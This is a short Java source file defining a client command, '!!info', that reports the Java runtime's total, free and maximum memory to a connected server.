package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;

public class FuncInfo implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!info";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 0;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        Runtime rt=Runtime.getRuntime();
        HandleConn.writeToServerIgnoreException("Memory:\ntotal:"+rt.totalMemory()+"\tfree:"+rt.freeMemory()+"\tmax:"+rt.maxMemory()+
                "\n");
    }
}
